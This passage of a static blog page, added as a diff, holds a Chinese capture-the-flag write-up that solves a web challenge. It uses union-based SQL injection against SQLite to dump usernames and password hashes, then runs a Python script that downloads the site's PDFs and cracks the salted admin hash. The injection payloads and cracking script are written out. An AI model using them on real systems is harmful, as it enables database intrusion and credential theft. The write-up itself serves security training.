+setcookie('name',' '.$row['name'], time() + 60, '/');
+header(&quot;Location: /&quot;);
+die();
+}
+
+}
+
+if(isset($_GET['debug']))
+highlight_file('login.php');
+?&gt;
+&lt;!-- TODO: Remove ?debug-Parameter! --&gt; 
+</code></pre>
+<p>判定POST提交的usr和pw是否存在，很显然usr处存在注入<br>
+这里提醒是sqlite数据库<br>
+tips：</p>
+<p>sqlite数据库有一张sqlite_master表，<br>
+里面有type/name/tbl_name/rootpage/sql记录着用户创建表时的相关信息<br>
+我们使用sqlmap进行尝试<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580066217.png" alt="" loading="lazy"><br>
+可见，存在注入<br>
+但是并没有跑出来，可能是我的网速问题<br>
+这里我们知道了他的数据库是sqlite<br>
+那么我们进行手工注入<br>
+1’ --+,不报错，说明闭合方式确定了。</p>
+<pre><code>1' order by 3 --+报错，1' order by 2 --+不报错，说明字段是2，
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623580070494.png" alt="" loading="lazy"><br>
+这里我们看到有回显了<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580075007.png" alt="" loading="lazy"></p>
+<pre><code>CREATE TABLE Users(
+id int primary key,
+name varchar(255),
+password varchar(255),
+hint varchar(255)
+)
+</code></pre>
+<p>我们查询到了他的数据库，发现有hint这个选项<br>
+进去看看看<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580079763.png" alt="" loading="lazy"><br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580084075.png" alt="" loading="lazy"><br>
+这里查到，需要他的论文，<br>
+我们查询一下其他的列</p>
+<pre><code>1' union select id,group_concat(id) from users--+得到1，2，3
+
+1' union select id,group_concat(name) from users--+得到admin,fritze,hansi
+
+1' union select id,group_concat(password) from users--+得到3fab54a50e770d830c0416df817567662a9dc85c、54eae8935c90f467427f05e4ece82cf569f89507、34b0bb7c304949f9ff2fc101eef0f048be10d3bd
+</code></pre>
+<p><img src="https://https://jinqipiaopiao.github.io//post-images/1623580088217.png" alt="" loading="lazy"><br>
+我们猜测，他的密码应该和pdf有关<br>
+使用网上的脚本<br>
+python3爬取多目标网页PDF文件并下载到指定目录：</p>
+<pre><code>import requests
+import re
+import os
+import sys
+
+re1 = '[a-fA-F0-9]{32,32}.pdf'
+re2 = '[0-9\/]{2,2}index.html'
+
+pdf_list = []
+def get_pdf(url):
+global pdf_list 
+print(url)
+req = requests.get(url).text
+re_1 = re.findall(re1,req)
+for i in re_1:
+pdf_url = url+i
+pdf_list.append(pdf_url)
+re_2 = re.findall(re2,req)
+for j in re_2:
+new_url = url+j[0:2]
+get_pdf(new_url)
+return pdf_list
+# return re_2
+
+pdf_list = get_pdf('http://220.249.52.133:46876/')
+print(pdf_list)
+for i in pdf_list:
+os.system('wget '+i)
+
+from io import StringIO
+
+#python3
+from pdfminer.pdfpage import PDFPage
+from pdfminer.converter import TextConverter
+from pdfminer.converter import PDFPageAggregator
+from pdfminer.layout import LTTextBoxHorizontal, LAParams
+from pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreter
+
+
+import sys
+import string
+import os
+import hashlib
+import importlib
+import random
+from urllib.request import urlopen
+from urllib.request import Request
+
+
+def get_pdf():
+return [i for i in os.listdir(&quot;./&quot;) if i.endswith(&quot;pdf&quot;)]
+
+
+def convert_pdf_to_txt(path_to_file):
+rsrcmgr = PDFResourceManager()
+retstr = StringIO()
+codec = 'utf-8'
+laparams = LAParams()
+device = TextConverter(rsrcmgr, retstr, codec=codec, laparams=laparams)
+fp = open(path_to_file, 'rb')
+interpreter = PDFPageInterpreter(rsrcmgr, device)
+password = &quot;&quot;
+maxpages = 0
+caching = True
+pagenos=set()
+
+for page in PDFPage.get_pages(fp, pagenos, maxpages=maxpages, password=password,caching=caching, check_extractable=True):
+interpreter.process_page(page)
+
+text = retstr.getvalue()
+
+fp.close()
+device.close()
+retstr.close()
+return text
+
+
+def find_password():
+pdf_path = get_pdf()
+for i in pdf_path:
+print (&quot;Searching word in &quot; + i)
+pdf_text = convert_pdf_to_txt(&quot;./&quot;+i).split(&quot; &quot;)
+for word in pdf_text:
+sha1_password = hashlib.sha1(word.encode('utf-8')+'Salz!'.encode('utf-8')).hexdigest()
+if (sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c'):
+print (&quot;Find the password :&quot; + word)
+exit()
+        
+
+if __name__ == &quot;__main__&quot;:
+find_password()
+</code></pre>
+<p>得到admin的密码为ThinJerboa<br>
+<img src="https://https://jinqipiaopiao.github.io//post-images/1623580095122.png" alt="" loading="lazy"><br>
+————————————————<br>
+版权声明：本文为CSDN博主「无名之涟」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/hxhxhxhxx/article/details/107846000</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#1baby_web">1.baby_web</a></li>
+<li><a href="#2training-www-robots">2.Training-WWW-Robots</a></li>
+<li><a href="#3php_rcethinkphp5-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">3.php_rce（thinkphp5 远程命令执行漏洞）</a></li>
+<li><a href="#4web_php_includephp%E4%BC%AA%E5%8D%8F%E8%AE%AE-strstr%E5%87%BD%E6%95%B0%E7%9A%84%E7%BB%95%E8%BF%87">4.Web_php_include（php://伪协议 + strstr（）函数的绕过）</a></li>
+<li><a href="#5ics-06">5.ics-06</a></li>
+<li><a href="#6warmup">6.warmup</a></li>
+<li><a href="#7newscenter">7.NewsCenter</a></li>
+<li><a href="#8nannannannan-batman">8.NaNNaNNaNNaN-Batman</a></li>
+<li><a href="#9php2">9.PHP2</a></li>
+<li><a href="#10unserialize3">10.unserialize3</a></li>
+<li><a href="#11upload1">11.upload1</a></li>
+<li><a href="#12web_python_template_injection">12Web_python_template_injection</a></li>
+<li><a href="#13web_php_unserialize">13.Web_php_unserialize</a></li>
+<li><a href="#14supersqli">14.supersqli</a></li>
+<li><a href="#15easytornado">15.easytornado</a></li>
+<li><a href="#easy-calc">Easy Calc</a></li>
+<li><a href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019php">[极客大挑战 2019]PHP</a></li>
+<li><a href="#shrine">shrine</a></li>
+<li><a href="#mfw">mfw</a></li>
+<li><a href="#web2">web2</a></li>
+<li><a href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2018fakebook">[网鼎杯 2018]Fakebook</a></li>
+<li><a href="#%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E4%B9%8Bics-05">攻防世界web之ics-05</a></li>
+<li><a href="#favorite_number">favorite_number</a></li>
+<li><a href="#lottery">Lottery</a></li>
+<li><a href="#flatscience">FlatScience</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://https://jinqipiaopiao.github.io/post/gong-fang-shi-jie-web-xin-shou-qu/">
+              <h3 class="post-title">
+                攻防世界（Web新手区）
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
